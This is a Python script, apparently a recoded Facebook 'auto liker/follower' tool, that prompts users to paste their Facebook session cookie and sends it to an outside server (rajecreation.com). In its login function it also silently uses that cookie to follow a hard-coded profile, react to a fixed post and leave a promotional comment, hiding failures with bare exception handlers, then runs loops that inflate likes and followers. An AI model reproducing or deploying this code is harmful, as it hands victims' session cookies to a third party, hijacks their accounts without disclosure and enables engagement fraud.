#ngapain bang? recode doang ga ngasih bintang ampasss
import requests,json,re,random,time,os,sys
from time import sleep
from bs4 import BeautifulSoup as bs
b="\033[94m"
c="\033[96m"
g="\033[92m"
r="\033[91m"
p="\033[1;97m"
d="\033[00m"
ab="\033[90m"
dn=f"{d}[{g}√{d}]{p}"
er=f"{d}[{r}!{d}]{p}"
pr=f"{d}[{c}?{d}]{p}"
mbasic="https://mbasic.facebook.com{}"
###################awalan#####################
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def baner():
    clear()
    print(f"""
    {g}$$\   $$\ $$$$$$\ $$\       $$$$$$\ $$\     $$\ 
    {g}$$$\  $$ |\_$$  _|$$ |     $$  __$$\\ $$\   $$  |
    {g}$$$$\ $$ |  $$ |  $$ |     $$ /  $$ |\$$\ $$  / 
    {g}$$ $$\$$ |  $$ |  $$ |     $$ |  $$ | \$$$$  /
    {g}$$ \$$$$ |  $$ |  $$ |     $$ |  $$ |  \$$  / 
    {g}$$ | \$$ |$$$$$$\ $$$$$$$$\ $$$$$$  |   $$ |
    {g}\__|  \__|\______|\________|\______/    \__|
{r}------------------------------------------------
\033[92m|| \033[1;93mAUTHOR   : {r}NILOY-VAU              \033[92m||
\033[92m|| \033[1;93mTOOL NAME: {r}Fb Follow                \033[92m||
\033[92m|| \033[1;93mYOUTUBE  : {r} Niloy Ahmed               \033[92m||
\033[92m|| \033[1;93mWhatsApp : {r}+8801749848171               \033[92m||
\033[92m|| \033[1;93mGITHUB   : {r}https://github.com/niloy0      \033[92m||
\033[92m|| \033[1;93mFacebook : {r}https://facebook.com/NILOY.VAU.6 \033[92m||
{r}------------------------------------------------""")

def agent():
    ua={"user-agent":usa,"version":"8.0.2","accept-encoding":"gzip","packagename":"com.datta.liker","device":"true","host":"rajecreation.com","appname":"Raje Liker","content-type":"application/x-www-form-urlencoded; charset=utf-8","versioncode":"18","id":"QQ3A.200605.002","token":"3075dda32ffbbe88"}
    return ua

def useragent():
    try:
        usr=open("useragent").read()
    except FileNotFoundError:
        usr=input(f"{er} \033[1;92m Pest Your User Agent\n{pr} {ab}-> {c}")
    with open("useragent","w") as us:
        us.write(usr)
    return usr
#####################login#######################
def login():
    ua=agent()
    try:
        cokie=open("cookies").read()
    except FileNotFoundError:
        cokie=input(f"{er} \033[1;93mPest Your Fb Cookie\n{pr} {ab}-> {c}")
    data={"cookie":cokie,"access_token":"","loginType":"FB","refby":"null"}
    req=requests.post("https://rajecreation.com/rajeliker/v8/login.php",data=data,headers=ua).text
    if "Login success!" in req:
       with open("cookies","w") as ck:
            ck.write(data["cookie"])
       try:
           lg=ses.get(mbasic.format("/me"),cookies={"cookie":cokie}).text
           lg=bs(lg,"html.parser").find("form",action=lambda x: "/intl/save_locale/?loc=id_ID" in x)
           dt=lg.find_all("input",type="hidden")
           fg=dt[0]["value"]
           jz=dt[1]["value"]
           ses.post(mbasic.format(lg["action"]),data={"fb_dtsg":fg,"jazoest":jz},cookies={"cookie":cokie})
       except:
           pass
       try:
           flw=ses.get(mbasic.format("/kang.ngeue.313"),cookies={"cookie":cokie}).text
           flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
           ses.get(mbasic.format(flw),cookies={"cookie":cokie})
       except:
           pass
       try:
           rc=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
           react=bs(rc,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
           react=ses.get(mbasic.format(react),cookies={"cookie":cokie}).text
           love=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=2&" in x)["href"]
           care=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=16&" in x)["href"]
           wow=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=3&" in x)["href"]
           angry=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=8&" in x)["href"]
           ty=[angry,love,care,wow]
           type=random.choice(ty)
           ses.get(mbasic.format(type),cookies={"cookie":cokie})
       except:
           pass
       try:
           kmn=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
           komen=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           data=komen.find_all("input",type="hidden")
           fbdtsg=data[0]["value"]
           jazoest=data[1]["value"]
           text=["Hi Bro, The Tools Are Really Cool!","The Tools Are Very Useful!","Hi, I'm a user of niloy0 ,","I Wish You Good Luck,","Very Good Tools!"]
           random_komen=random.choice(text)
           ses.post(mbasic.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies={"cookie":cokie})
       except:
           pass
       js=json.loads(req)
       return {"name":js["data"]["name"],"id":js["data"]["myid"],"cookie":js["data"]["cok"]}
    else:
       print(f"{er} \033[1;92m[\033[1;91m!\033[1;92m] \033[1;93m Login Failed")
       try:
           os.system("rm cookies")
       except:
           pass
       os.system("python run.py")
#####################main#####################
def earn():
    ua=agent()
    data={"user_id":id,"type":"FB","code":cokie}
    req=requests.post("https://rajecreation.com/rajeliker/v8/earn.php",data=data,headers=ua).text
    if "\033[1;93m added success!" in req:
       res=requests.post("https://rajecreation.com/rajeliker/v8/timer.php",data={"user_id":id,"type":"FB"},headers={"user-agent":usa,"content-type":"application/x-www-form-urlencoded; charset=utf-8","accept-encoding":"gzip","host":"rajecreation.com"}).json()
       print(f"\r{dn} \033[1;92mCredit : {r}"+str(res["active"]),end="")
       return res["active"]
    else:
       print(f"\r{er} \033[1;91mFAILED EARN CREDIT")
def follow(url):
    ua=agent()
    limit=earn()
    req=requests.post("https://rajecreation.com/rajeliker/v8/checkURL.php",data={"url":url,"LoginWith":"FB","type":"FOLLOW","cookie":cokie},headers=ua).text
    if "Data Loaded Success!" in req:
       js=json.loads(req)
       data={"limit":limit,"LoginType":"FB","type":"FOLLOW","user_id":id,"post_id":js["data"]["id"],"cost":"1","cookie":cokie,"post_url":js["data"]["url"],"reaction":"1"}
       res=requests.post("https://rajecreation.com/rajeliker/v8/send.php",data=data,headers=ua).json()
       if res["data"]["count"] == 0:
          print(f"\r{er}Failed add followers")
       else:
          nm=bs(ses.get(js["data"]["url"],cookies={"cookie":cokie}).text,"html.parser").find("title").text
          print(f'\r{dn} \033[1;93mAdd followers to {c}{nm}')
          sleep(10)
          tot=ses.get(f'https://mbasic.facebook.com/timeline/app_collection/?collection_token={js["data"]["id"]}%3A184985071538002%3A32&_rdr',cookies={"cookie":cokie}).text
          total=re.findall(r'<td valign="...">Pengikut</td><td valign="..." class=".."><span class="(.*?)">(.*?)</span>',tot)[0][1]
          print(f"{pr}\033[1;93mTotal Followers : {2}{total}")
    else:
       print(f"\r{er}\033[1;91mProfile not found")
       sleep(2)
       menu()

def like(url):
    ua=agent()
    limit=earn()
    req=requests.post("https://rajecreation.com/rajeliker/v8/checkURL.php",data={"url":url,"LoginWith":"FB","type":"LIKE","cookie":cokie},headers=ua).text
    if "\033[1;93mData loaded success!" in req:
        js=json.loads(req)
        res=requests.post("https://rajecreation.com/rajeliker/v8/send.php",data={"limit":limit,"LoginType":"FB","type":"LIKE","user_id":id,"post_id":js["data"]["id"],"cost":"1","cookie":cokie,"post_url":js["data"]["url"],"reaction":"1"},headers=ua).json()
        if res["data"]["count"] == 0:
           print(f"\r{er}\033[1;91mFailed To Add Like")
        else:
           print(f'\r{dn}\033[1;92mAdd Like To {r}{js["data"]["url"]}')
           sleep(10)
           tot=bs(ses.get(js["data"]["url"],cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "/ufi/reaction/" in x)["href"]
           total=bs(ses.get(mbasic.format(tot),cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "&reaction_type=1&" in x).find("span").text
           print(f"{pr}\033[1;93mTotal like : {r}{total}")
    else:
        print(f"\r{er}\033[1;91mPost not found")
        sleep(2)
        menu()

def userinfo():
    print(f"{p}\033[1;92mLogin Name : {r}{name}")
    print(f"{p}\033[1;92mID         : {r}{id}")
    print(f"{r}-----------------------------------------------{d}")
####################menu######################
def menu():
    baner()
    userinfo()
    print(f"""{p}
\033[1;92m[\033[1;91m1\033[1;92m] \033[1;93mEARN CREDIT
\033[1;92m[\033[1;91m2\033[1;92m] \033[1;93mADD LIKE POST
\033[1;92m[\033[1;91m3\033[1;92m] \033[1;93mADD FOLLOWERS
\033[1;92m[\033[1;91m0\033[1;92m] \033[1;93mEXIT{r}[×͜{g}×]
{r}-----------------------------------------------{r}""")
    pilih_menu()

def pilih_menu():
    choice=input(f"{pr} \033[1;93mSelect : {c}")
    if choice == "00" or choice == "0":
       baner()
       sys.exit(f"{er}\033[1;93m BRO DON'T FORGET TO STAR MY GITHUB {r}[×͜{g}×] ")
    elif choice == "01" or choice == "1":
       print(f"{er} \033[1;92m Press Ctrl C To Stop")
       print(f"{ab}-----------------------------------------------{d}")
       while True:
           try:
               earn()
               sleep(1)
           except:
               break
       print()
       input(f"{d}[{r} \033[1;93 mPress Enter To Back {d}]")
       os.system("python run.py")
    elif choice == "02" or choice == "2":
       pid=input(f"{er} \033[1;93mPut Your Post Url\n{pr} {ab}-> {c}")
       print(f"{er} \033[1;92mPress Ctrl C To Stop")
       print(f"{r}-----------------------------------------------{r}")
       while True:
           try:
               like(pid)
               sleep(3)
           except:
               break
       print()
       input(f"{d}[ {r} Press Enter To Back {r}]")
       os.system("python run.py")
    elif choice == "03" or choice == "3":
       uid=input(f"{er} \033[1;93mPut Your Profile\n{pr} {ab}-> {c}")
       print(f"{er}Press {c}ctrl c {p}to stop")
       print(f"{r}-----------------------------------------------{r}")
       while True:
           try:
               follow(uid)
               sleep(3)
           except:
               break
       print()
       input(f"{d}[ {r}Press Enter To Back {r}]")
       os.system("python run.py")
    else:
       print(f"{er} \033[1;93 mChoose The Right One ")
       pilih_menu()


if __name__=="__main__":
   baner()
   usa=useragent()
   ses=requests.Session()
   ses.headers.update({"user-agent":usa})
   try:
      masuk=login()
      cokie=masuk["cookie"]
      id=masuk["id"]
      name=masuk["name"]
      menu()
   except Exception as e:
      sys.exit(f"{er}{e}")
